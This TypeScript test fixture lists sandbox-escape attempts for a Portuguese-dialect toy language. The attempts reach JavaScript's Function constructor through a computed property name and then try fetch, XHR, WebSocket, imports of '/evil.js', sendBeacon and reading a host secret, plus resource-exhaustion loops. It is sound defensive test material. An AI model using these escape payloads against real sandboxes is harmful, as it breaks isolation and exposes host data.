import type { HostileProgram } from './hostile-programs.types.ts';

// O mundo fechado barra os nomes de JavaScript: o ataque que compila chega ao motor pelo índice computado.
// Sem unsafe-eval o construtor já falha; a conexão bloqueada é a segunda camada se a primeira regredir.
const CONSTRUCTOR_KEY = 'uai chave é "con" mais "structor"';
const UNREACHABLE_LINES = 5000;

const attempt = (jsBody: string): string =>
  [
    CONSTRUCTOR_KEY,
    'prosa("tentei")',
    'tenta_aí {',
    `  espera_um_cadim [][chave][chave]("${jsBody}")()`,
    '} se_der_ruim (erro) {',
    '  prosa("deu ruim: " mais erro.mensagem)',
    '}',
  ].join('\n');

const settled = (setup: string): string =>
  `return new Promise(function (resolve, reject) { ${setup} setTimeout(function () { reject(new Error('Timeout')); }, 1500); });`;

const escapes: readonly HostileProgram[] = [
  { name: 'fetch', expect: 'tried-and-failed', source: (url) => attempt(`return fetch('${url}/fetch');`) },
  {
    name: 'XMLHttpRequest',
    expect: 'tried-and-failed',
    source: (url) =>
      attempt(settled(`var request = new XMLHttpRequest(); request.open('GET', '${url}/xhr'); request.onload = function () { resolve(request.status); }; request.onerror = function () { reject(new Error('XhrBlocked')); }; request.send();`)),
  },
  {
    name: 'WebSocket',
    expect: 'tried-and-failed',
    source: (url) =>
      attempt(settled(`var socket = new WebSocket('${url.replace('http', 'ws')}/socket'); socket.onopen = function () { resolve('open'); }; socket.onerror = function () { reject(new Error('SocketBlocked')); };`)),
  },
  { name: 'import dinâmico', expect: 'tried-and-failed', source: (url) => attempt(`return import('${url}/evil.js');`) },
  { name: 'importScripts', expect: 'tried-and-failed', source: (url) => attempt(`return importScripts('${url}/evil.js');`) },
  { name: 'sendBeacon', expect: 'tried-and-failed', source: (url) => attempt(`return navigator.sendBeacon('${url}/beacon', 'x');`) },
  { name: 'construtor pelo índice computado', expect: 'tried-and-failed', source: () => attempt('return this;') },
  { name: 'segredo do host', expect: 'tried-and-failed', source: () => attempt("return localStorage.getItem('segredo-do-host');") },
  { name: 'Function direto', expect: 'compile-error', source: () => 'prosa(Function("return this")())' },
  { name: 'constructor com ponto', expect: 'compile-error', source: () => 'prosa([].constructor.constructor("return this")())' },
];

const limits: readonly HostileProgram[] = [
  { name: 'laço infinito', expect: 'stopped-by-limit', source: () => 'enquanto_tiver (certeza) { }' },
  {
    name: 'saída gigante',
    expect: 'stopped-by-limit',
    source: () => `vai_indo (trem i é 0; i menor_que ${String(UNREACHABLE_LINES)}; i é i mais 1) {\n  prosa("linha " mais i)\n}`,
  },
  { name: 'pergunta sem resposta', expect: 'stopped-by-limit', source: () => 'uai resposta é espera_um_cadim pergunta("Quem é ocê?")\nprosa(resposta)' },
  {
    name: 'recursão sem fim',
    expect: 'tried-and-failed',
    source: () => 'faz_trem desce(n) {\n  faz_favor desce(n mais 1)\n}\nprosa("tentei")\ntenta_aí {\n  desce(0)\n} se_der_ruim (erro) {\n  prosa("deu ruim: " mais erro.mensagem)\n}',
  },
];

export const HOSTILE_PROGRAMS: readonly HostileProgram[] = [...escapes, ...limits];
